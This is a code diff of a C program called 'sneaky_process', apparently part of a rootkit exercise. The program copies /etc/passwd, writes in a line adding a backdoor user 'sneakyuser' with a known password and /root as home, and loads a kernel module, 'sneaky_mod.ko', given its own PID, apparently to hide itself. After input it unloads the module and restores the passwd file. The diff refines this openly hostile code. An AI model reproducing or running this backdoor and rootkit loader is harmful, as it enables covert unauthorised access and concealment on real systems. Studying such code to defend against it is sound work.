@@ -24,7 +24,7 @@ void copyFile(const char *src, const char *dest)
 
     // append new line to src
     fseek(s, 0, SEEK_END);
-    const char *sneaky_str = "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+    const char *sneaky_str = "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
     fprintf(s, "%s", sneaky_str);
     fclose(s);
 }
@@ -34,14 +34,11 @@ int main(void)
     int sneaky_pid = getpid();
     printf("sneaky_process pid = %d\n", sneaky_pid);
 
-    // Copy /etc/passwd into /tmp/passwd (TODO: replace files)
+    // Copy /etc/passwd into /tmp/passwd
     copyFile("/etc/passwd", "/tmp/passwd");
 
     char load_module[100];
-    sprintf(load_module, "insmod sneaky_mod.ko sneaky_process_pid=%d", sneaky_pid);
-    // printf("Checking dir\n");
-    // system("dir");
-    // printf("load module sys call: %s\n", load_module);
+    sprintf(load_module, "insmod sneaky_mod.ko sneaky_pid=%d", sneaky_pid);
     system(load_module);
 
     // read from stdin until q
@@ -59,5 +56,6 @@ int main(void)
     const char *unload_cmd = "rmmod sneaky_mod.ko";
     system(unload_cmd);
     copyFile("/tmp/passwd", "/etc/passwd");
+    system("rm /tmp/passwd");
     return EXIT_SUCCESS;
 }
